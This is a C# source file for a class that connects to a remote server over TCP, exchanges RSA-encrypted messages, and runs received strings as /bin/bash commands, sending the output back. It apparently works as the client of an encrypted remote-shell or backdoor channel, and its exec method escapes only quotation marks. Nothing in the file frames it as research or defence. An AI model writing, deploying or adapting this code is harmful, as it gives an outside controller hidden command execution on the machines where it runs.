using System.Runtime.CompilerServices;
using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Asn1;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Asn1.Pkcs;

namespace tevsn
{
    public class Tevsn
    {
        public String IP { get;set; }
        public IPEndPoint ServerAddress {get;set;}
        public int Port { get;set; }
        public string Key { get;set; }
        public string? PrivKey { get;set; }
        private BinaryReader? reader;
        private BinaryWriter? writer;
        public TcpClient tcpClient = new TcpClient();
        
        public Tevsn(string ip, int port, string key)
        {
            this.IP = ip;
            this.Port = port;
            this.Key = key;
            this.ServerAddress = new IPEndPoint(IPAddress.Parse(ip), port);
        }

        //try to connect, if success, return true
        public bool Connect()
        {
            try
            {
                tcpClient.Connect(IP, Port);
                return true;
            }
            catch (Exception e)
            {   
                e.ToString();
                return false;
            }
        }

        public bool Fallback()
        {
            try
            {
                tcpClient.Close();
                return true;
            } catch (Exception) {
                Console.Write("wtf.");
                return false;
            }
        }

        //check if connection is alive
        public bool IsConnected()
        {
            try
            {
                if (tcpClient.Client.Poll(0, SelectMode.SelectRead))
                {
                    byte[] buff = new byte[1];
                    if (tcpClient.Client.Receive(buff, SocketFlags.Peek) == 0)
                    {
                        return false;
                    }
                }
                return true;
            }
            catch (Exception)
            {
                Console.Write("Client isn't connected anymore!");
                return false;
            }
        }

        public void Send(String data)
        {
            NetworkStream clientStream = tcpClient.GetStream();
            writer = new BinaryWriter(clientStream);
            string toSend = Encrypt(data);
            byte[] toSendBytes = Encoding.UTF8.GetBytes(toSend);
            byte[] lenBytes = BitConverter.GetBytes(toSendBytes.Length);
            Console.Write("Sending: " + toSend + "\n");
            Array.Reverse(lenBytes);
            writer.Write(lenBytes);
            writer.Write(toSendBytes);
            writer.Flush();
        }

        public String Receive()
        {
            try
            {
                String message;
                NetworkStream clientStream = tcpClient.GetStream();
                reader = new BinaryReader(clientStream);
                byte[] lenBytes = reader.ReadBytes(4);
                Array.Reverse(lenBytes);
                int len = BitConverter.ToInt32(lenBytes);
                byte[] bytes = reader.ReadBytes(len);
                if(bytes.Length > 1)
                {
                    string str = Encoding.UTF8.GetString(bytes);
                    byte[] b64 = Convert.FromBase64String(str);
                    message = Decrypt(b64);
                    Console.Write("Received: " + message + "\n");
                    return message;
                }
                else 
                {
                    return "--";
                }
            } catch (Exception) {
                return "reviveTime";
            }
        }

        public string exec(String cmd)
        {
            // Start the child process.
            Process p = new Process();
            var escapedArgs = cmd.Replace("\"", "\\\"");
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "/bin/bash";
            p.StartInfo.Arguments = $"-c \"{escapedArgs}\"";
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            Console.Write("Console Output: " + output + "\n");
            return output;
        }


        //write method for rsa decryption with given public key in base64 format
        public string Decrypt(byte[] data)
        {
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            string keyBase64 = PrivKey!.Replace("\r", "").Replace("\n", "").Replace(" ", "");
            byte[] privateInfoByte = Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromBase64String(keyBase64)));
            rsa.ImportPkcs8PrivateKey(new ReadOnlySpan<byte>(privateInfoByte), out _);
            byte[] decryptedData = rsa.Decrypt(data, RSAEncryptionPadding.Pkcs1);
            return Encoding.UTF8.GetString(decryptedData);
        }

        public string Encrypt(string data)
        {
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            string keyBase64 = Key.Replace("\r", "").Replace("\n", "").Replace(" ", "");
            byte[] publicInfoByte = Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromBase64String(keyBase64)));
            Asn1Object pubKeyObj = Asn1Object.FromByteArray(publicInfoByte);//You can also read from the stream here and import it locally   
            AsymmetricKeyParameter pubKey = PublicKeyFactory.CreateKey(publicInfoByte);
            RSAParameters rsaParams = DotNetUtilities.ToRSAParameters((RsaKeyParameters)pubKey);
            rsa.ImportParameters(rsaParams);
            byte[] dataToEncrypt = Encoding.UTF8.GetBytes(Convert.ToBase64String(Encoding.UTF8.GetBytes(data)));
            byte[] encryptedData = rsa.Encrypt(dataToEncrypt, false);
            return Convert.ToBase64String(encryptedData);
        }

    }
}
